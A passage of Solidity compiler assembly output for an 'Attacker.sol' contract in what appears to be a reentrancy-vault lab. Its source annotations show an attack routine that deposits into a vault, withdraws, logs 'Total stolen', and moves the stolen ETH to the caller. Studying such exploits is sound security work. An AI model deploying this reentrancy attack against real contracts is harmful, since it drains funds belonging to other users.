\"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":776:820  require(msg.value > 0, \"Need ETH to attack\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3294:3315   */\n      mstore\n        /* \"#utility.yul\":3351:3353   */\n      0x12\n        /* \"#utility.yul\":3331:3349   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3324:3354   */\n      mstore\n      shl(0x70, 0x4e6565642045544820746f2061747461636b)\n        /* \"#utility.yul\":3370:3388   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3363:3411   */\n      mstore\n        /* \"#utility.yul\":3428:3446   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":776:820  require(msg.value > 0, \"Need ETH to attack\") */\n      tag_108\n        /* \"#utility.yul\":3110:3452   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":776:820  require(msg.value > 0, \"Need ETH to attack\") */\n    tag_128:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":839:883  console.log(\"Starting reentrancy attack...\") */\n      tag_130\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1d\n      dup2\n      mstore\n      0x20\n      add\n      0x5374617274696e67207265656e7472616e63792061747461636b2e2e2e000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":839:850  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":839:883  console.log(\"Starting reentrancy attack...\") */\n      jump\t// in\n    tag_130:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":893:956  console.log(\"Initial attacker balance:\", address(this).balance) */\n      tag_131\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x19\n      dup2\n      mstore\n      0x20\n      add\n      0x496e697469616c2061747461636b65722062616c616e63653a00000000000000\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":934:955  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":893:904  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":893:956  console.log(\"Initial attacker balance:\", address(this).balance) */\n      jump\t// in\n    tag_131:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":966:1031  console.log(\"Initial vault balance:\", vault.getContractBalance()) */\n      tag_132\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x16\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x51, 0x24b734ba34b0b6103b30bab63a103130b630b731b29d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1004:1009  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1004:1028  vault.getContractBalance */\n      and\n      0x6f9fb98a\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1004:1030  vault.getContractBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_134\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_134:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_135\n      swap2\n      swap1\n      tag_105\n      jump\t// in\n    tag_135:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":966:977  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":966:1031  console.log(\"Initial vault balance:\", vault.getContractBalance()) */\n      jump\t// in\n    tag_132:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1097:1102  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1097:1110  vault.deposit */\n      and\n      0xd0e30db0\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1118:1127  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1097:1130  vault.deposit{value: msg.value}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_136\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_136:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_138\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_138:\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1149:1219  console.log(\"Balance after deposit:\", vault.getBalance(address(this))) */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x16\n      dup2\n      mstore\n      shl(0x51, 0x2130b630b731b29030b33a32b9103232b837b9b4ba1d)\n      0x20\n      dup3\n      add\n      mstore\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1187:1192  vault */\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1187:1218  vault.getBalance(address(this)) */\n      swap2\n      mload\n      shl(0xe0, 0xf8b2cb4f)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1212:1216  this */\n      address\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1187:1218  vault.getBalance(address(this)) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":1354:1405   */\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1149:1219  console.log(\"Balance after deposit:\", vault.getBalance(address(this))) */\n      tag_139\n      swap6\n      pop\n      swap1\n      swap4\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1187:1192  vault */\n      swap1\n      swap2\n      and\n      swap2\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1187:1203  vault.getBalance */\n      0xf8b2cb4f\n      swap1\n        /* \"#utility.yul\":1327:1345   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1187:1218  vault.getBalance(address(this)) */\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_134\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1149:1219  console.log(\"Balance after deposit:\", vault.getBalance(address(this))) */\n    tag_139:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1302:1303  0 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1288:1299  attackCount */\n      0x01\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1288:1303  attackCount = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1313:1324  totalStolen */\n      0x02\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1313:1328  totalStolen = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1386:1391  vault */\n      sload\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1386:1411  vault.withdraw(msg.value) */\n      mload(0x40)\n      shl(0xe0, 0x2e1a7d4d)\n      dup2\n      mstore\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1401:1410  msg.value */\n      callvalue\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1386:1411  vault.withdraw(msg.value) */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":815:840   */\n      mstore\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1386:1391  vault */\n      swap1\n      swap2\n      and\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1386:1400  vault.withdraw */\n      0x2e1a7d4d\n      swap1\n        /* \"#utility.yul\":788:806   */\n      0x24\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1386:1411  vault.withdraw(msg.value) */\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_145\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_145:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_147\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_147:\n      pop\n      pop\n      pop\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1430:1462  console.log(\"Attack completed!\") */\n      tag_148\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x11\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x78, 0x41747461636b20636f6d706c6574656421)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1430:1441  console.log */\n      tag_17\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1430:1462  console.log(\"Attack completed!\") */\n      jump\t// in\n    tag_148:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1472:1513  console.log(\"Total stolen:\", totalStolen) */\n      tag_149\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x0d\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x99, 0x2a37ba30b61039ba37b632b71d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1501:1512  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1472:1483  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1472:1513  console.log(\"Total stolen:\", totalStolen) */\n      jump\t// in\n    tag_149:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1523:1586  console.log(\"Final vault balance:\", vault.getContractBalance()) */\n      tag_150\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x14\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x61, 0x2334b730b6103b30bab63a103130b630b731b29d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1559:1564  vault */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1559:1583  vault.getContractBalance */\n      and\n      0x6f9fb98a\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1559:1585  vault.getContractBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_134\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1523:1586  console.log(\"Final vault balance:\", vault.getContractBalance()) */\n    tag_150:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1610:1638  AttackCompleted(totalStolen) */\n      0x4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f9\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1626:1637  totalStolen */\n      sload(0x02)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1610:1638  AttackCompleted(totalStolen) */\n      mload(0x40)\n      tag_154\n      swap2\n        /* \"#utility.yul\":815:840   */\n      dup2\n      mstore\n        /* \"#utility.yul\":803:805   */\n      0x20\n        /* \"#utility.yul\":788:806   */\n      add\n      swap1\n        /* \"#utility.yul\":669:846   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":1610:1638  AttackCompleted(totalStolen) */\n    tag_154:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":722:1645  function attack() external payable override {... */\n      jump\t// out\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5126:5244  function getVaultBalance() external view override returns (uint256) {... */\n    tag_79:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5185:5192  uint256 */\n      0x00\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5211:5216  vault */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5211:5235  vault.getContractBalance */\n      and\n      0x6f9fb98a\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":5211:5237  vault.getContractBalance() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_103\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4529:4870  function withdrawStolenFunds() external override {... */\n    tag_88:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4606:4627  address(this).balance */\n      selfbalance\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4645:4656  balance > 0 */\n      dup1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4637:4681  require(balance > 0, \"No funds to withdraw\") */\n      tag_160\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":3659:3661   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4637:4681  require(balance > 0, \"No funds to withdraw\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":3641:3662   */\n      mstore\n        /* \"#utility.yul\":3698:3700   */\n      0x14\n        /* \"#utility.yul\":3678:3696   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":3671:3701   */\n      mstore\n      shl(0x60, 0x4e6f2066756e647320746f207769746864726177)\n        /* \"#utility.yul\":3717:3735   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":3710:3760   */\n      mstore\n        /* \"#utility.yul\":3777:3795   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4637:4681  require(balance > 0, \"No funds to withdraw\") */\n      tag_108\n        /* \"#utility.yul\":3457:3801   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4637:4681  require(balance > 0, \"No funds to withdraw\") */\n    tag_160:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4719:4754  msg.sender.call{value: balance}(\"\") */\n      mload(0x40)\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4701:4713  bool success */\n      0x00\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4719:4729  msg.sender */\n      caller\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4742:4749  balance */\n      dup4\n      swap1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4701:4713  bool success */\n      dup4\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4719:4754  msg.sender.call{value: balance}(\"\") */\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4701:4713  bool success */\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4719:4754  msg.sender.call{value: balance}(\"\") */\n      dup2\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4742:4749  balance */\n      dup6\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4719:4729  msg.sender */\n      dup8\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4719:4754  msg.sender.call{value: balance}(\"\") */\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_167\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_166)\n    tag_167:\n      0x60\n      swap2\n      pop\n    tag_166:\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4700:4754  (bool success, ) = msg.sender.call{value: balance}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4772:4779  success */\n      dup1\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4764:4799  require(success, \"Transfer failed\") */\n      tag_168\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n        /* \"#utility.yul\":4218:4220   */\n      0x20\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4764:4799  require(success, \"Transfer failed\") */\n      0x04\n      dup3\n      add\n        /* \"#utility.yul\":4200:4221   */\n      mstore\n        /* \"#utility.yul\":4257:4259   */\n      0x0f\n        /* \"#utility.yul\":4237:4255   */\n      0x24\n      dup3\n      add\n        /* \"#utility.yul\":4230:4260   */\n      mstore\n      shl(0x8a, 0x151c985b9cd9995c8819985a5b1959)\n        /* \"#utility.yul\":4276:4294   */\n      0x44\n      dup3\n      add\n        /* \"#utility.yul\":4269:4314   */\n      mstore\n        /* \"#utility.yul\":4331:4349   */\n      0x64\n      add\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4764:4799  require(success, \"Transfer failed\") */\n      tag_108\n        /* \"#utility.yul\":4016:4355   */\n      jump\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4764:4799  require(success, \"Transfer failed\") */\n    tag_168:\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4818:4863  console.log(\"Stolen ETH withdrawn:\", balance) */\n      tag_95\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x15\n      dup2\n      mstore\n      0x20\n      add\n      shl(0x59, 0x29ba37b632b71022aa24103bb4ba34323930bbb71d)\n      dup2\n      mstore\n      pop\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4855:4862  balance */\n      dup4\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4818:4829  console.log */\n      tag_19\n        /* \"projects/01-reentrancy-vault/contracts/vulnerable/Attacker.sol\":4818:4863  console.log(\"Stolen ETH withdrawn:\", balance) */\n      jump\t// in\n        /* \"lib/forge-std/src/console.sol\":851:980  function _sendLogPayload(bytes memory payload) internal pure {... */\n    tag_93:\n        /* \"lib/forge-std/src/console.sol\":922:973  _castToPure(_sendLogPayloadImplementation)(payload) */\n      tag_90\n        /* \"lib/forge-std/src/console.sol\":965:972  payload */\n      dup2\n        /* \"lib/forge-std/src/console.sol\":265:287  address consoleAddress */\n      0x00\n        /* \"lib/forge-std/src/console.sol\":131:173  0x000000000000000000636F6e736F6c652e6c6f67 */\n      0x636f6e736f6c652e6c6f67\n        /* \"lib/forge-std/src/console.sol\":265:305  address consoleAddress = CONSOLE_ADDRESS */\n      swap1\n      pop\n        /* \"lib/forge-std/src/console.sol\":594:595  0 */\n      0x00\n        /* \"lib/forge-std/src/console.sol\":571:572  0 */\n      dup1\n        /* \"lib/forge-std/src/console.sol\":541:548  payload */\n      dup4\n        /* \"lib/forge-std/src/console.sol\":535:549  mload(payload) */\n      mload\n        /* \"lib/forge-std/src/console.sol\":510:512  32 */\n      0x20\n        /* \"lib/forge-std/src/console.sol\":501:508  payload */\n      dup6\n        /* \"lib/forge-std/src/console.sol\":497:513  add(payload, 32) */\n      add\n        /* \"lib/forge-std/src/console.sol\":461:475  consoleAddress */\n      dup5\n        /* \"lib/forge-std/src/console.sol\":434:439  gas() */\n      gas\n        /* \"lib/forge-std/src/console.sol\":402:613  staticcall(... */\n      staticcall\n        /* \"lib/forge-std/src/console.sol\":381:627  pop(... */\n      pop\n        /* \"lib/forge-std/src/console.sol\":367:637  {... */\n      pop\n        /* \"lib/forge-std/src/console.sol\":180:643  function _sendLogPayloadImplementation(bytes memory payload) internal view {... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":14:141   */\n    tag_182:\n        /* \"#utility.yul\":75:85   */\n      0x4e487b71\n        /* \"#utility.yul\":70:73   */\n      0xe0\n        /* \"#utility.yul\":66:86   */\n      shl\n        /* \"#utility.yul\":63:64   */\n      0x00\n        /* \"#utility.yul\":56:87   */\n      mstore\n        /* \"#utility.yul\":106:110   */\n      0x11\n        /* \"#utility.yul\":103:104   */\n      0x04\n        /* \"#utility.yul\":96:111   */\n      mstore\n        /* \"#utility.yul\":130:134   */\n      0x24\n        /* \"#utility.yul\":127:128   */\n      0x00\n        /* \"#utility.yul\":120:135   */\n      revert\n        /* \"#utility.yul\":146:271   */\n    tag_25:\n        /* \"#utility.yul\":211:220   */\n      dup1\n      dup3\n      add\n        /* \"#utility.yul\":232:242   */\n      dup1\n      dup3\n      gt\n        /* \"#utility.yul\":229:265   */\n      iszero\n      tag_188\n      jumpi\n        /* \"#utility.yul\":245:263   */\n      tag_188\n      tag_182\n      jump\t// in\n    tag_188:\n        /* \"#utility.yul\":146:271   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":276:411   */\n    tag_27:\n        /* \"#utility.yul\":315:318   */\n      0x00\n        /* \"#utility.yul\":336:353   */\n      0x01\n      dup3\n      add\n        /* \"#utility.yul\":333:376   */\n      tag_191\n      jumpi\n        /* \"#utility.yul\":356:374   */\n      tag_191\n      tag_182\n      jump\t// in\n    tag_191:\n      pop\n        /* \"#utility.yul\":403:404   */\n      0x01\n        /* \"#utility.yul\":392:405   */\n      add\n      swap1\n        /* \"#utility.yul\":276:411   */\n      jump\t// out\n        /* \"#utility.yul\":1416:1839   */\n    tag_183:\n        /* \"#utility.yul\":1458:1461   */\n      0x00\n        /* \"#utility.yul\":1496:1501   */\n      dup2\n        /* \"#utility.yul\":1490:1502   */\n      mload\n        /* \"#utility.yul\":1523:1529   */\n      dup1\n        /* \"#utility.yul\":1518:1521   */\n      dup5\n        /* \"#utility.yul\":1511:1530   */\n      mstore\n        /* \"#utility.yul\":1548:1549   */\n      0x00\n        /* \"#utility.yul\":1558:1720   */\n    tag_197:\n        /* \"#utility.yul\":1572:1578   */\n      dup2\n        /* \"#utility.yul\":1569:1570   */\n      dup2\n        /* \"#utility.yul\":1566:1579   */\n      lt\n        /* \"#utility.yul\":1558:1720   */\n      iszero\n      tag_199\n      jumpi\n        /* \"#utility.yul\":1634:1638   */\n      0x20\n        /* \"#utility.yul\":1690:1703   */\n      dup2\n      dup6\n      add\n        /* \"#utility.yul\":1686:1708   */\n      dup2\n      add\n        /* \"#utility.yul\":1680:1709   */\n      mload\n        /* \"#utility.yul\":1662:1673   */\n      dup7\n      dup4\n      add\n        /* \"#utility.yul\":1658:1678   */\n      dup3\n      add\n        /* \"#utility.yul\":1651:1710   */\n      mstore\n        /* \"#utility.yul\":1587:1599   */\n      add\n        /* \"#utility.yul\":1558:1720   */\n      jump(tag_197)\n    tag_199:\n        /* \"#utility.yul\":1562:1565   */\n      pop\n        /* \"#utility.yul\":1765:1766   */\n      0x00\n        /* \"#utility.yul\":1758:1762   */\n      0x20\n        /* \"#utility.yul\":1749:1755   */\n      dup3\n        /* \"#utility.yul\":1744:1747   */\n      dup7\n        /* \"#utility.yul\":1740:1756   */\n      add\n        /* \"#utility.yul\":1736:1763   */\n      add\n        /* \"#utility.yul\":1729:1767   */\n      mstore\n        /* \"#utility.yul\":1828:1832   */\n      0x20\n        /* \"#utility.yul\":1821:1823   */\n      0x1f\n        /* \"#utility.yul\":1817:1824   */\n      not\n        /* \"#utility.yul\":1812:1814   */\n      0x1f\n        /* \"#utility.yul\":1804:1810   */\n      dup4\n        /* \"#utility.yul\":1800:1815   */\n      add\n        /* \"#utility.yul\":1796:1825   */\n      and\n        /* \"#utility.yul\":1791:1794   */\n      dup6\n        /* \"#utility.yul\":1787:1826   */\n      add\n        /* \"#utility.yul\":1783:1833   */\n      add\n        /* \"#utility.yul\":1776:1833   */\n      swap2\n      pop\n      pop\n        /* \"#utility.yul\":1416:1839   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1844:2064   */\n    tag_92:\n        /* \"#utility.yul\":1993:1995   */\n      0x20\n        /* \"#utility.yul\":1982:1991   */\n      dup2\n        /* \"#utility.yul\":1975:1996   */\n      mstore\n        /* \"#utility.yul\":1956:1960   */\n      0x00\n        /* \"#utility.yul\":2013:2058   */\n      tag_201\n        /* \"#utility.yul\":2054:2056   */\n      0x20\n        /* \"#utility.yul\":2043:2052   */\n      dup4\n        /* \"#utility.yul\":2039:2057   */\n      add\n        /* \"#utility.yul\":2031:2037   */\n      dup5\n        /* \"#utility.yul\":2013:2058   */\n      tag_183\n      jump\t// in\n    tag_201:\n        /* \"#utility.yul\":2005:2058   */\n      swap4\n        /* \"#utility.yul\":1844:2064   */\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2069:2360   */\n    tag_97:\n        /* \"#utility.yul\":2246:2248   */\n      0x40\n        /* \"#utility.yul\":2235:2244   */\n      dup2\n        /* \"#utility.yul\":2228:2249   */\n      mstore\n        /* \"#utility.yul\":2209:2213   */\n      0x00\n        /* \"#utility.yul\":2266:2311   */\n      tag_203\n        /* \"#utility.yul\":2307:2309   */\n      0x40\n        /* \"#utility.yul\":2296:2305   */\n      dup4\n        /* \"#utility.yul\":2292:2310   */\n      add\n        /* \"#utility.yul\":2284:2290   */\n      dup6\n        /* \"#utility.yul\":2266:2311   */\n      tag_183\n      jump\t// in\n    tag_203:\n        /* \"#utility.yul\":2258:2311   */\n      swap1\n      pop\n        /* \"#utility.yul\":2347:2353   */\n      dup3\n        /* \"#utility.yul\":2342:2344   */\n      0x20\n        /* \"#utility.yul\":2331:2340   */\n      dup4\n        /* \"#utility.yul\":2327:2345   */\n      add\n        /* \"#utility.yul\":2320:2354   */\n      mstore\n        /* \"#utility.yul\":2069:2360   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2573:2757   */\n    tag_105:\n        /* \"#utility.yul\":2643:2649   */\n      0x00\n        /* \"#utility.yul\":2696:2698   */\n      0x20\n        /* \"#utility.yul\":2684:2693   */\n      dup3\n        /* \"#utility.yul\":2675:2682   */\n      dup5\n        /* \"#utility.yul\":2671:2694   */\n      sub\n        /* \"#utility.yul\":2667:2699   */\n      slt\n        /* \"#utility.yul\":2664:2716   */\n      iszero\n      tag_206\n      jumpi\n        /* \"#utility.yul\":2712:2713   */\n      0x00\n        /* \"#utility.yul\":2709:2710   */\n      dup1\n        /* \"#utility.yul\":2702:2714   */\n      revert\n        /* \"#utility.yul\":2664:2716   */\n    tag_206:\n      pop\n        /* \"#utility.yul\":2735:2751   */\n      mload\n      swap2\n        /* 